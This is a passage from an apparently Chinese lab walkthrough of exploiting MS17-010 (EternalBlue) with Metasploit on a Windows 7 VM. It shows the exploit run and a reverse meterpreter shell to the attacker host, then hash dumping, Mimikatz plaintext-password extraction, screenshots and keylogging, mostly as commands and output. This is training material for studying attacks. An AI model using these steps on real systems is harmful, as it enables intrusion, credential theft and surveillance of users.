+</span></span><span class=line><span class=cl>   Id  Name
+</span></span><span class=line><span class=cl>   --  ----
+</span></span><span class=line><span class=cl>   <span class=m>0</span>   Automatic Target
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>View the full module info with the info, or info -d command.
+</span></span></code></pre></td></tr></table></div></div><p>PS：漏洞利用（Exploit）只是打开大门的“钥匙”，载荷（Payload）是进门之后要执行的任务。Metasploit 将默认Payload设置为<code>windows/x64/meterpreter/reverse_tcp</code>。其中<code>windows/x64</code>指明靶机系统是64位 windows 系统；<code>meterpreter</code>是 Metasploit 的“王牌”载荷，运行在内存中，不写入硬盘（难以被察觉），且提供了极其丰富的内置命令（如 <code>hashdump</code>, <code>screenshot</code>, <code>webcam_snap</code>），远比普通的 CMD 命令行强大；<code>reverse_tcp</code>指明使用反向TCP连接，用于绕过防火墙，同时确保在复杂的网络环境下，攻击载荷能稳定地传输和通信，不会轻易断开连接。</p><p>PS：设置反向连接后，需要指定<code>lhost</code>参数，以指定靶机出发漏洞后能够成功连接回攻击机</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf6 exploit<span class=o>(</span>windows/smb/ms17_010_eternalblue<span class=o>)</span> &gt; run
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Started reverse TCP handler on 10.0.0.223:4444 
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.0.0.17:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 10.0.0.17:445         - Host is likely VULNERABLE to MS17-010! - Windows <span class=m>7</span> Enterprise <span class=m>7600</span> x64 <span class=o>(</span>64-bit<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.0.0.17:445         - Scanned <span class=m>1</span> of <span class=m>1</span> hosts <span class=o>(</span>100% <span class=nb>complete</span><span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 10.0.0.17:445 - The target is vulnerable.
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.0.0.17:445 - Connecting to target <span class=k>for</span> exploitation.
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 10.0.0.17:445 - Connection established <span class=k>for</span> exploitation.
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 10.0.0.17:445 - Target OS selected valid <span class=k>for</span> OS indicated by SMB reply
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.0.0.17:445 - CORE raw buffer dump <span class=o>(</span><span class=m>25</span> bytes<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.0.0.17:445 - 0x00000000  <span class=m>57</span> <span class=m>69</span> 6e <span class=m>64</span> 6f <span class=m>77</span> <span class=m>73</span> <span class=m>20</span> <span class=m>37</span> <span class=m>20</span> <span class=m>45</span> 6e <span class=m>74</span> <span class=m>65</span> <span class=m>72</span> <span class=m>70</span>  Windows <span class=m>7</span> Enterp
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.0.0.17:445 - 0x00000010  <span class=m>72</span> <span class=m>69</span> <span class=m>73</span> <span class=m>65</span> <span class=m>20</span> <span class=m>37</span> <span class=m>36</span> <span class=m>30</span> <span class=m>30</span>                       rise <span class=m>7600</span>       
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 10.0.0.17:445 - Target arch selected valid <span class=k>for</span> arch indicated by DCE/RPC reply
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.0.0.17:445 - Trying exploit with <span class=m>12</span> Groom Allocations.
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.0.0.17:445 - Sending all but last fragment of exploit packet
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.0.0.17:445 - Starting non-paged pool grooming
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 10.0.0.17:445 - Sending SMBv2 buffers
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 10.0.0.17:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.0.0.17:445 - Sending final SMBv2 buffers.
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.0.0.17:445 - Sending last fragment of exploit packet!
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.0.0.17:445 - Receiving response from exploit packet
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 10.0.0.17:445 - ETERNALBLUE overwrite completed successfully <span class=o>(</span>0xC000000D<span class=o>)</span>!
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.0.0.17:445 - Sending egg to corrupted connection.
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.0.0.17:445 - Triggering free of corrupted buffer.
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>203846</span> bytes<span class=o>)</span> to 10.0.0.17
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Meterpreter session <span class=m>1</span> opened <span class=o>(</span>10.0.0.223:4444 -&gt; 10.0.0.17:49161<span class=o>)</span> at 2025-12-31 05:39:27 +0000
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 10.0.0.17:445 - <span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 10.0.0.17:445 - <span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-WIN-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 10.0.0.17:445 - <span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>meterpreter &gt;
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>meterpreter &gt; getuid
+</span></span><span class=line><span class=cl>Server username: NT AUTHORITY<span class=se>\S</span>YSTEM
+</span></span></code></pre></td></tr></table></div></div><p>PS：当前权限——<code>NT AUTHORITY\SYSTEM</code> 权限（通常简称为 <strong>System 权限</strong>）是 Windows 操作系统中的最高权限。在 Windows 安全模型中，<code>SYSTEM</code> 账户（也称为本地系统账户）是操作系统内核及其核心服务运行的身份。</p><ul><li><strong>它比管理员（Administrator）更高级</strong>：Administrator 仍然受用户帐户控制（UAC）的限制，而 SYSTEM 账户不受任何限制。</li><li><strong>权限范围</strong>：它拥有对本地计算机上<strong>所有资源</strong>（文件、注册表、进程、硬件）的完整访问权限。</li></ul><p>现在，攻击机可以进行以下行为：</p><ul><li><strong>读取所有用户的文件</strong>：Kali可以进入 <code>C:\Users\</code> 下任何一个文件夹（如 Administrator 或其他普通用户），读取他们的桌面、文档和隐私文件。</li><li><strong>控制所有进程</strong>：Kali可以杀死防火墙进程、杀毒软件进程，或者将你的恶意程序注入到任何系统进程（如 <code>lsass.exe</code>）中。</li><li><strong>操作注册表</strong>：Kali可以修改系统的核心配置，甚至破坏系统引导。</li><li><strong>获取明文密码</strong>：只有在 SYSTEM 权限下，Kali才能使用 <code>load kiwi</code> (Mimikatz) 从内存中提取出其他已登录用户的明文密码。</li><li><strong>权限降级（伪装）</strong>：Kali可以随意切换到任何一个普通用户的身份（通过 <code>impersonate_token</code>），看看他们在电脑上留下了什么。</li></ul><h3 id=典型的后渗透攻击行为>典型的“后渗透”攻击行为</h3><h4 id=一凭据窃取>一、凭据窃取</h4><h5 id=1-导出哈希值hashdump>1. 导出哈希值（Hashdump）</h5><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>meterpreter &gt; hashdump
+</span></span><span class=line><span class=cl>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span class=line><span class=cl>Ankh:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
+</span></span><span class=line><span class=cl>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span class=line><span class=cl>HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:e19302c2cb502fb48256d5cfbb575047:::
+</span></span></code></pre></td></tr></table></div></div><p>PS：这是靶机用户登陆密码的NTLM哈希。攻击者即使不知道明文，也可以通过“哈希传递攻击（Pass-the-Hash）”直接登录其他机器</p><h5 id=2-抓取内存中的明文密码mimikatz>2. 抓取内存中的明文密码（Mimikatz）</h5><p><code>load kiwi # 加载增强版的Mimikatz</code> -> <code>creds_all # 尝试提取所有凭证</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>meterpreter &gt; load kiwi
+</span></span><span class=line><span class=cl>Loading extension kiwi...
+</span></span><span class=line><span class=cl>  .#####.   mimikatz 2.2.0 <span class=m>20191125</span> <span class=o>(</span>x64/windows<span class=o>)</span>
+</span></span><span class=line><span class=cl> .## ^ <span class=c1>##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo)</span>
+</span></span><span class=line><span class=cl> <span class=c1>## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
+</span></span><span class=line><span class=cl> <span class=c1>## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span>
+</span></span><span class=line><span class=cl> <span class=s1>&#39;## v ##&#39;</span>        Vincent LE TOUX            <span class=o>(</span> vincent.letoux@gmail.com <span class=o>)</span>
+</span></span><span class=line><span class=cl>  <span class=s1>&#39;#####&#39;</span>         &gt; http://pingcastle.com / http://mysmartlogon.com  ***/
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Success.
+</span></span><span class=line><span class=cl>meterpreter &gt; creds_all
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Running as SYSTEM
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Retrieving all credentials
+</span></span><span class=line><span class=cl>msv <span class=nv>credentials</span>
+</span></span><span class=line><span class=cl><span class=o>===============</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Username  Domain   LM                 NTLM               SHA1
+</span></span><span class=line><span class=cl>--------  ------   --                 ----               ----
+</span></span><span class=line><span class=cl>Ankh      Ankh-PC  44efce164ab921caa  32ed87bdb5fdc5e9c  6ed5833cf35286ebf8
+</span></span><span class=line><span class=cl>                   ad3b435b51404ee    ba88547376818d4    662b7b5949f0d742bb
+</span></span><span class=line><span class=cl>                                                         ec3f
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>wdigest <span class=nv>credentials</span>
+</span></span><span class=line><span class=cl><span class=o>===================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Username  Domain     Password
+</span></span><span class=line><span class=cl>--------  ------     --------
+</span></span><span class=line><span class=cl><span class=o>(</span>null<span class=o>)</span>    <span class=o>(</span>null<span class=o>)</span>     <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>ANKH-PC$  WORKGROUP  <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>Ankh      Ankh-PC    <span class=m>123456</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>tspkg <span class=nv>credentials</span>
+</span></span><span class=line><span class=cl><span class=o>=================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Username  Domain   Password
+</span></span><span class=line><span class=cl>--------  ------   --------
+</span></span><span class=line><span class=cl>Ankh      Ankh-PC  <span class=m>123456</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>kerberos <span class=nv>credentials</span>
+</span></span><span class=line><span class=cl><span class=o>====================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Username  Domain     Password
+</span></span><span class=line><span class=cl>--------  ------     --------
+</span></span><span class=line><span class=cl><span class=o>(</span>null<span class=o>)</span>    <span class=o>(</span>null<span class=o>)</span>     <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>Ankh      Ankh-PC    <span class=m>123456</span>
+</span></span><span class=line><span class=cl>ankh-pc$  WORKGROUP  <span class=o>(</span>null<span class=o>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>PS：在Win7中，攻击者通常能够直接看到<strong>Password</strong>一栏显示了明文密码，这是由于Win7默认将凭据存储在lsass进程内存中，且未加密。SYSTEM权限可以直接读取它。</p><h4 id=二隐私监控与取证monitoring>二、隐私监控与取证（Monitoring）</h4><h5 id=1实时屏幕截图>1、实时屏幕截图</h5><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>meterpreter &gt; screenshot
+</span></span><span class=line><span class=cl>Screenshot saved to: /root/ZuMWyRDh.jpeg
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/7.png width=860 height=618 srcset="/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/7_hu_678321c30ae0e7d.png 480w, /p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/7_hu_7ac598bae94a8f45.png 1024w" loading=lazy alt=7 class=gallery-image data-flex-grow=139 data-flex-basis=333px></p><h5 id=2-键盘记录keylogging>2. 键盘记录（Keylogging）</h5><p>如果当前是System权限则切换到用户权限 -> <code>keyscan_start # 开启键盘监听</code> -> Ankh用户输入<code>Hello?</code> -> <code>keyscan_dump # Kali屏幕输出记录下的按键</code> -> <code>keyscan_stop # 停止监听</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>meterpreter &gt; getuid <span class=c1># 查看当前权限：SYSTEM</span>
+</span></span><span class=line><span class=cl>Server username: NT AUTHORITY<span class=se>\S</span>YSTEM
+</span></span><span class=line><span class=cl>meterpreter &gt; ps <span class=c1># 查看进程列表，Session 1通常代表用户</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Process <span class=nv>List</span>
+</span></span><span class=line><span class=cl><span class=o>============</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> PID   PPID  Name        Arch  Session  User              Path
+</span></span><span class=line><span class=cl> ---   ----  ----        ----  -------  ----              ----
+</span></span><span class=line><span class=cl> <span class=m>0</span>     <span class=m>0</span>     <span class=o>[</span>System Pr
+</span></span><span class=line><span class=cl>             ocess<span class=o>]</span>
+</span></span><span class=line><span class=cl> <span class=m>4</span>     <span class=m>0</span>     System      x64   <span class=m>0</span>
+</span></span><span class=line><span class=cl> <span class=m>268</span>   <span class=m>4</span>     smss.exe    x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\S</span>YS  <span class=se>\S</span>ystemRoot<span class=se>\S</span>yste
+</span></span><span class=line><span class=cl>                                        TEM               m32<span class=se>\s</span>mss.exe
+</span></span><span class=line><span class=cl> <span class=m>312</span>   <span class=m>484</span>   svchost.ex  x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\L</span>OC
+</span></span><span class=line><span class=cl>             e                          AL SERVICE
+</span></span><span class=line><span class=cl> <span class=m>344</span>   <span class=m>328</span>   csrss.exe   x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\S</span>YS  C:<span class=se>\W</span>indows<span class=se>\s</span>ystem
+</span></span><span class=line><span class=cl>                                        TEM               32<span class=se>\c</span>srss.exe
+</span></span><span class=line><span class=cl> <span class=m>360</span>   <span class=m>484</span>   SearchInde  x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\S</span>YS
+</span></span><span class=line><span class=cl>             xer.exe                    TEM
+</span></span><span class=line><span class=cl> <span class=m>392</span>   <span class=m>328</span>   wininit.ex  x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\S</span>YS  C:<span class=se>\W</span>indows<span class=se>\s</span>ystem
+</span></span><span class=line><span class=cl>             e                          TEM               32<span class=se>\w</span>ininit.exe
+</span></span><span class=line><span class=cl> <span class=m>404</span>   <span class=m>384</span>   csrss.exe   x64   <span class=m>1</span>        NT AUTHORITY<span class=se>\S</span>YS  C:<span class=se>\W</span>indows<span class=se>\s</span>ystem
+</span></span><span class=line><span class=cl>                                        TEM               32<span class=se>\c</span>srss.exe
+</span></span><span class=line><span class=cl> <span class=m>448</span>   <span class=m>384</span>   winlogon.e  x64   <span class=m>1</span>        NT AUTHORITY<span class=se>\S</span>YS  C:<span class=se>\W</span>indows<span class=se>\s</span>ystem
+</span></span><span class=line><span class=cl>             xe                         TEM               32<span class=se>\w</span>inlogon.exe
+</span></span><span class=line><span class=cl> <span class=m>484</span>   <span class=m>392</span>   services.e  x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\S</span>YS  C:<span class=se>\W</span>indows<span class=se>\s</span>ystem
+</span></span><span class=line><span class=cl>             xe                         TEM               32<span class=se>\s</span>ervices.exe
+</span></span><span class=line><span class=cl> <span class=m>500</span>   <span class=m>392</span>   lsass.exe   x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\S</span>YS  C:<span class=se>\W</span>indows<span class=se>\s</span>ystem
+</span></span><span class=line><span class=cl>                                        TEM               32<span class=se>\l</span>sass.exe
+</span></span><span class=line><span class=cl> <span class=m>508</span>   <span class=m>392</span>   lsm.exe     x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\S</span>YS  C:<span class=se>\W</span>indows<span class=se>\s</span>ystem
+</span></span><span class=line><span class=cl>                                        TEM               32<span class=se>\l</span>sm.exe
+</span></span><span class=line><span class=cl> <span class=m>620</span>   <span class=m>484</span>   svchost.ex  x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\S</span>YS
+</span></span><span class=line><span class=cl>             e                          TEM
+</span></span><span class=line><span class=cl> <span class=m>696</span>   <span class=m>484</span>   svchost.ex  x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\N</span>ET
+</span></span><span class=line><span class=cl>             e                          WORK SERVICE
+</span></span><span class=line><span class=cl> <span class=m>760</span>   <span class=m>484</span>   svchost.ex  x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\L</span>OC
+</span></span><span class=line><span class=cl>             e                          AL SERVICE
+</span></span><span class=line><span class=cl> <span class=m>836</span>   <span class=m>484</span>   svchost.ex  x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\S</span>YS
+</span></span><span class=line><span class=cl>             e                          TEM
+</span></span><span class=line><span class=cl> <span class=m>868</span>   <span class=m>484</span>   svchost.ex  x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\S</span>YS
+</span></span><span class=line><span class=cl>             e                          TEM
+</span></span><span class=line><span class=cl> <span class=m>988</span>   <span class=m>484</span>   svchost.ex  x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\N</span>ET
+</span></span><span class=line><span class=cl>             e                          WORK SERVICE
+</span></span><span class=line><span class=cl> <span class=m>1052</span>  <span class=m>484</span>   spoolsv.ex  x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\S</span>YS  C:<span class=se>\W</span>indows<span class=se>\S</span>ystem
+</span></span><span class=line><span class=cl>             e                          TEM               32<span class=se>\s</span>poolsv.exe
+</span></span><span class=line><span class=cl> <span class=m>1072</span>  <span class=m>484</span>   svchost.ex  x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\L</span>OC
+</span></span><span class=line><span class=cl>             e                          AL SERVICE
+</span></span><span class=line><span class=cl> <span class=m>1168</span>  <span class=m>484</span>   svchost.ex  x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\L</span>OC
+</span></span><span class=line><span class=cl>             e                          AL SERVICE
+</span></span><span class=line><span class=cl> <span class=m>1192</span>  <span class=m>484</span>   wmpnetwk.e  x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\N</span>ET
+</span></span><span class=line><span class=cl>             xe                         WORK SERVICE
+</span></span><span class=line><span class=cl> <span class=m>1368</span>  <span class=m>2012</span>  explorer.e  x64   <span class=m>1</span>        Ankh-PC<span class=se>\A</span>nkh      C:<span class=se>\W</span>indows<span class=se>\E</span>xplor
+</span></span><span class=line><span class=cl>             xe                                           er.EXE
+</span></span><span class=line><span class=cl> <span class=m>1420</span>  <span class=m>484</span>   sppsvc.exe  x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\N</span>ET
+</span></span><span class=line><span class=cl>                                        WORK SERVICE
+</span></span><span class=line><span class=cl> <span class=m>1656</span>  <span class=m>484</span>   svchost.ex  x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\L</span>OC
+</span></span><span class=line><span class=cl>             e                          AL SERVICE
+</span></span><span class=line><span class=cl> <span class=m>1692</span>  <span class=m>484</span>   svchost.ex  x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\N</span>ET
+</span></span><span class=line><span class=cl>             e                          WORK SERVICE
+</span></span><span class=line><span class=cl> <span class=m>1760</span>  <span class=m>1368</span>  taskmgr.ex  x64   <span class=m>1</span>        Ankh-PC<span class=se>\A</span>nkh      C:<span class=se>\W</span>indows<span class=se>\s</span>ystem
+</span></span><span class=line><span class=cl>             e                                            32<span class=se>\t</span>askmgr.exe
+</span></span><span class=line><span class=cl> <span class=m>1916</span>  <span class=m>484</span>   svchost.ex  x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\S</span>YS
+</span></span><span class=line><span class=cl>             e                          TEM
